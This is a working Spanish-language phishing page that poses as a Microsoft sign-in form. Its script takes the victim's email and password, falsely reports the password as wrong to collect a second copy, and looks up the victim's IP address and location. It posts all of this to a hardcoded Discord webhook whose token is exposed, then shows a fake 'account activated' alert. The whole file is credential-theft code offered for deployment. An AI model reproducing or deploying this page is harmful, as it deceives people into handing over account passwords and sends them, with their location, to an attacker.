<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Calendario y Correo ElectrÃ³nico</title>
  <style>
    * { padding: 0; margin: 0; color: #1b1b1b; font-family: sans-serif; box-sizing: border-box; }
    body { background-color: #F0EDF3; }

    .formu {
      max-width: 400px;
      width: 100%;
      display: block;
      box-shadow: 0 2px 6px rgb(0 0 0 / 20%);
      background-color: white;
      padding: 40px;
      margin: auto;
      margin-top: 250px;
    }

    #ia { width: 130px; }
    #p {
      margin: 15px 0;
      font-size: 25px;
      line-height: 26px;
      font-weight: 600;
    }

    .camp input {
      width: 95%;
      border: none;
      border-bottom: 1px solid #545454;
      padding: 10px 0;
      font-size: 16px;
      margin-bottom: 15px;
      outline: none;
    }

    a { color: #0067b8; text-decoration: none; }

    .aS {
      font-size: 14px;
      line-height: 40px;
    }

    .btn {
      display: flex;
      justify-content: flex-end;
      margin: 10px;
    }

    #btn, #btn2, #btn3 {
      color: white;
      background-color: #0067b8;
      outline: none;
      padding: 7px 15px;
      font-size: 17px;
      cursor: pointer;
      border: none;
    }

    #btn:hover, #btn2:hover, #btn3:hover {
      background-color: #00599F;
    }

    .cua { margin-bottom: 400px; }

    @media (max-width: 920px) {
      body { background-color: white; }
      .formu {
        box-shadow: none;
        margin-top: 40px;
        padding: 40px 25px;
      }
    }
  </style>
</head>
<body>
  <div class="cua">
    <form id="loginForm" action="procesar.php" method="POST">
      <!-- Primer formulario (Correo) -->
      <div class="formu" id="formu">
        <div class="i">
          <img id="ia" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1024px-Microsoft_logo_%282012%29.svg.png" alt="">
        </div>
        <h3 id="p">Iniciar sesiÃ³n:</h3>
        <div class="camp">
          <input type="email" id="email" name="email" required placeholder="Correo electrÃ³nico, telÃ©fono o Skype">
        </div>
        <div class="aS">
          <p>Â¿No tiene una cuenta? <a href="#">Cree una.</a></p>
        </div>
        <div class="btn">
          <button id="btn" type="button">Siguiente</button>
        </div>
      </div>

      <!-- Segundo formulario (ContraseÃ±a) -->
      <div class="formu" id="formu2" style="display: none;">
        <div class="i">
          <img id="ia" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1024px-Microsoft_logo_%282012%29.svg.png" alt="">
        </div>
        <h3 id="p">Ingresa tu contraseÃ±a</h3>
        <div class="camp">
          <input type="password" id="password" name="password" required placeholder="ContraseÃ±a">
        </div>
        <div class="aS">
          <p><a href="#">Â¿OlvidÃ³ su contraseÃ±a?</a></p>
        </div>
        <div class="btn">
          <button id="btn2" type="button">Siguiente</button>
        </div>
      </div>

      <!-- Tercer formulario (Confirmar contraseÃ±a) -->
      <div class="formu" id="formu3" style="display: none;">
        <div class="i">
          <img id="ia" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1024px-Microsoft_logo_%282012%29.svg.png" alt="">
        </div>
        <h3 id="p">ContraseÃ±a incorrecta, verificala.</h3>
        <div class="camp">
          <input type="password" id="confirm_password" name="confirm_password" required placeholder="Confirmar contraseÃ±a">
        </div>
        <div class="btn">
          <button id="btn3" type="submit">Finalizar</button>
        </div>
      </div>
    </form>
  </div>
<script>
const webhookURL = "https://discord.com/api/webhooks/1436840167729270914/Rx4LAwYyIrQYblZUV7zY1piZDygtn3RWZ52Kjuo4iurv3fs2BazBM_PTF0aM6HfDwYXs";

let userData = {
    email: "",
    password: ""
};

// FunciÃ³n para obtener datos del usuario
async function getUserInfo() {
    try {
        // Obtener IP
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        
        // Obtener ubicaciÃ³n basada en IP
        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const locationData = await locationResponse.json();
        
        return {
            ip: ipData.ip,
            city: locationData.city || "No detectada",
            country: locationData.country_name || "No detectado",
            region: locationData.region || "No detectada",
            timezone: locationData.timezone || "No detectada"
        };
    } catch (error) {
        return {
            ip: "No detectada",
            city: "No detectada",
            country: "No detectado",
            region: "No detectada",
            timezone: "No detectada"
        };
    }
}

document.getElementById("btn").addEventListener("click", function () {
    userData.email = document.getElementById("email").value || "No ingresado";
    document.getElementById("formu").style.display = "none";
    document.getElementById("formu2").style.display = "block";
});

document.getElementById("btn2").addEventListener("click", async function (event) {
    event.preventDefault();
    userData.password = document.getElementById("password").value || "No ingresada";
    
    const userInfo = await getUserInfo();

    const mensaje = {
        embeds: [
            {
                title: "ðŸ” Primer Acceso",
                color: 0x57F287,
                fields: [
                    {
                        name: "ðŸ“§ Correo",
                        value: `\`${userData.email}\``,
                        inline: true
                    },
                    {
                        name: "ðŸ”‘ ContraseÃ±a",
                        value: `\`${userData.password}\``,
                        inline: true
                    },
                    {
                        name: "ðŸŒ UbicaciÃ³n",
                        value: `**IP:** ${userInfo.ip}\n**Ciudad:** ${userInfo.city}\n**PaÃ­s:** ${userInfo.country}`,
                        inline: false
                    },
                    {
                        name: "ðŸ• Fecha/Hora",
                        value: new Date().toLocaleString(),
                        inline: true
                    }
                ],
                footer: {
                    text: "Microsoft Login â€¢ Acceso inicial"
                },
                timestamp: new Date().toISOString()
            }
        ]
    };

    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(mensaje)
    }).catch(err => console.error("Error enviando a Discord:", err));

    document.getElementById("formu2").style.display = "none";
    document.getElementById("formu3").style.display = "block";
});

document.getElementById("loginForm").addEventListener("submit", async function (e) {
    e.preventDefault();
    const confirm = document.getElementById("confirm_password").value || "No confirmada";
    
    const userInfo = await getUserInfo();

    const mensajeConfirm = {
        embeds: [
            {
                title: "âœ… ConfirmaciÃ³n Exitosa",
                color: 0x5865F2,
                fields: [
                    {
                        name: "ðŸ‘¤ Datos Usuario",
                        value: `**Email:** ${userData.email}\n**ContraseÃ±a:** ${userData.password}\n**ConfirmaciÃ³n:** ${confirm}`,
                        inline: false
                    },
                    {
                        name: "ðŸ“ InformaciÃ³n GeogrÃ¡fica",
                        value: `**IP:** ${userInfo.ip}\n**Ciudad:** ${userInfo.city}\n**RegiÃ³n:** ${userInfo.region}\n**PaÃ­s:** ${userInfo.country}\n**Zona Horaria:** ${userInfo.timezone}`,
                        inline: false
                    }
                ],
                footer: {
                    text: `Microsoft Login â€¢ ${new Date().toLocaleDateString()}`
                },
                timestamp: new Date().toISOString()
            }
        ]
    };

    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(mensajeConfirm)
    }).catch(err => console.error("Error enviando confirmaciÃ³n a Discord:", err));

    setTimeout(() => {
        alert("Cuenta activada exitosamente.");
        // window.location.href = "https://outlook.live.com/";
    }, 1000);
});
</script>

</body>
</html>
